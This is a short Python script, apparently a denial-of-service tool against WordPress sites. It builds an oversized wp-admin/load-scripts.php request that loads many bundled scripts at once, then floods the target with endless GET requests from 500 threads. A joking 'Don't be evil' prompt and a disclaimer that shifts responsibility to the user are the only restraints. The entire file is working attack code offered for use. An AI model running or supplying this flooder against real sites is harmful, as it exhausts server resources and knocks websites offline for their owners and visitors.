'''
That`s not the best DOS program for WP, but that works
'''

import requests, threading, Reader
import os,sys

scripts = Reader.Read('scripts') # Reading file with standart scripts
n = 500 # Number of threads
url = 'wp-admin/load-scripts.php?load=' # Standart path

for i in range(len(scripts)): # Making main part of url
    if i < (len(scripts)-1):
        url = url + scripts[i]+','
    else:
        url = url + scripts[i]

# Request to site         
def req():
    global url
    print('Thread '+str(i)+' started')
    # Just endless loop
    while True:
        try:
            print()
            request = requests.get(url)    
        except:
            continue
# Main func
def main():
    if input('Don`t be evil,Ok? :> [y/n]') == 'Y' or input('Don`t be evil :>') == 'y':
        print('Btw you take all responsibilities for all the things you will do, remember that.')
    else:
        print('So... Good bye :)')
        return
    
    global url
    if len(sys.argv) < 3:
        print('-u <URL> with \'/\' on the end :)')
        print(url)
        return
    else:
        url = sys.argv[2]+url
        print(url)
    
    try:
        req1 = requests.get(url)
        print(req1)
        print('Url working')
    except:
        print('Check URL, thats not working')
        print('May be that`s not WP based site')
        return

    e = []
    t = []
    print('Creating threads and starting DOS attack')
    for i in range(n+1):
        e.append(threading.Event())
    for i in range(n):
        t.append(threading.Thread(target = req))

    for i in range(n):
        t[i].start()
    for i in range(n):
        try:
            e[i].set()
        except:
            return
    for i in range(n):
        t[i].join()
main()
